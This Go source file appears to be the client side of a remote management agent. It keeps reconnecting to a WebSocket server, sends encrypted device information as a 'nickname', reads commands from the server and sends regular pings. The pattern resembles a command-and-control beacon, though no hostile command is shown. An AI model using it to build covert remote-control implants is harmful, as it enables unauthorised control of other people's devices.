package management

import (
	"Anthophila/information"
	"Anthophila/logging"
	"time"

	"github.com/gorilla/websocket"
)

// Константа інтервалу перепідключення
const reconnectInterval = 5 * time.Second

// Manager представляє менеджер WebSocket-зʼєднання
type Manager struct {
	LogStatus  bool
	LogAddress string
	ServerAddr string
	Key        string
}

// NewManager — конструктор (фабрика) для створення нового менеджера
func NewManager(logStatus bool, logAddress, serverAddr, key string) *Manager {
	return &Manager{
		LogStatus:  logStatus,
		LogAddress: logAddress,
		ServerAddr: serverAddr,
		Key:        key,
	}
}

// Start ініціалізує WebSocket-зʼєднання і запускає логіку обміну повідомленнями
func (m *Manager) Start() {
	// Отримання MAC-адреси пристрою
	cryptoManager, errEncrypt := NewCryptoManager(m.LogStatus, m.LogAddress, m.Key)
	if errEncrypt != nil {
		logging.Log(m.LogAddress, "Failed to initialize CryptoManager:v", errEncrypt.Error())
	}
	nickname := information.NewInfo().InfoJson()

	var wSocket *websocket.Conn
	var err error

	for {
		// Спроба підключення до сервера WebSocket
		wSocket, _, err = websocket.DefaultDialer.Dial(m.ServerAddr, nil)
		if err != nil {
			// Логування помилки підключення
			if m.LogStatus {
				logging.Log(m.LogAddress, "Error connecting to server: %v", err.Error())
				logging.Log(m.LogAddress, "Retrying in %v...", reconnectInterval.String())
			}
			// Затримка перед наступною спробою підключення
			time.Sleep(reconnectInterval)
			continue
		}

		// Підключення успішне, надсилаємо шифрорваний нікнейм
		err = wSocket.WriteMessage(websocket.TextMessage, []byte("nick:"+cryptoManager.EncryptText(nickname)))
		if err != nil {
			// Логування помилки відправки нікнейму
			if m.LogStatus {
				logging.Log(m.LogAddress, "Error sending nickname: %v", err.Error())
			}
			wSocket.Close()
			if m.LogStatus {
				logging.Log(m.LogAddress, "Retrying in %v...", reconnectInterval.String())
			}
			// Затримка перед наступною спробою підключення
			time.Sleep(reconnectInterval)
			continue
		}

		// Запуск горутіни для обробки отриманих повідомлень від сервера
		reader := NewReader(m.LogStatus, m.LogAddress, cryptoManager, wSocket)
		go reader.ReadMessageCommand(wSocket)

		// Основний цикл для надсилання повідомлень до сервера
		for {
			time.Sleep(reconnectInterval)

			errPing := wSocket.WriteMessage(websocket.TextMessage, []byte("Ping"))

			if errPing != nil {
				if m.LogStatus {
					logging.Log(m.LogAddress, "Error writing to server: %v", errPing.Error())
				}
				break
			}
		}

		// Якщо ми потрапили сюди, це означає, що з'єднання було розірвано
		if m.LogStatus {
			logging.Log(m.LogAddress, "Connection closed. Retrying in %v...", reconnectInterval.String())
		}
		wSocket.Close()
		// Затримка перед наступною спробою підключення
		time.Sleep(reconnectInterval)
	}
}
